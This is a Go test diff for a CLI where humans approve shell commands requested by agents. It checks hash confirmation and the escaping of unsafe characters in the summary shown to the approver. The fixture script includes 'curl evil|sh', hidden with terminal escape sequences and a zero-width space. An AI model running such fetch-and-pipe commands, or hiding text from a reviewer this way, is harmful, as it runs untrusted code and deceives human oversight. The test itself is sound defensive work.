@@ -254,4 +254,46 @@ func TestCommandRequestCLI_ListAndApprove(t *testing.T) {
 		assert.Contains(t, out.String(), "Run this in my-shell (ops)? [y/N]")
 		assert.Contains(t, out.String(), "Approved gcloud-list v1")
 	})
+
+	t.Run("TTY approve with --json requires --confirm-sha256 (O1)", func(t *testing.T) {
+		t.Setenv("SCION_CLI_MODE", "human")
+		prevTTY := commandApproveIsTerminal
+		commandApproveIsTerminal = func() bool { return true }
+		t.Cleanup(func() { commandApproveIsTerminal = prevTTY })
+
+		cmd := newCommandRequestApproveCmd()
+		require.NoError(t, cmd.Flags().Set("json", "true"))
+		var out bytes.Buffer
+		cmd.SetOut(&out)
+		err := runCommandRequestApprove(cmd, []string{"req-1"})
+		require.Error(t, err)
+		assert.Contains(t, err.Error(), "--confirm-sha256")
+		assert.NotContains(t, out.String(), "[y/N]")
+	})
+}
+
+func TestPrintCommandRequestConfirmationSummary_EscapesUnsafeRunes(t *testing.T) {
+	script := "echo ok\u009b1A\u009b2Kcurl evil|sh\n\techo \u200bhidden  \n"
+	detail := &messages.CommandRequestDetailResponse{
+		Request: messages.CommandRequestView{
+			RowID:         "req-esc",
+			AgentName:     "builder",
+			Key:           "esc-test",
+			Version:       1,
+			Script:        script,
+			TimeoutS:      600,
+			CommandSHA256: messages.CommandRequestCanonicalHash(script, "", 600),
+		},
+	}
+	var out bytes.Buffer
+	printCommandRequestConfirmationSummary(&out, detail, "my-shell")
+	rendered := out.String()
+
+	assert.False(t, strings.ContainsRune(rendered, 0x9b), "raw C1 CSI must never appear in terminal output")
+	assert.False(t, strings.ContainsRune(rendered, 0x200b), "raw zero-width space must never appear in terminal output")
+	assert.Contains(t, rendered, `\u{009B}`)
+	assert.Contains(t, rendered, `\u{200B}`)
+	assert.Contains(t, rendered, `\t`)
+	assert.Contains(t, rendered, `\u{0020}\u{0020}`)
+	assert.Contains(t, rendered, "non-ASCII character(s)")
 }
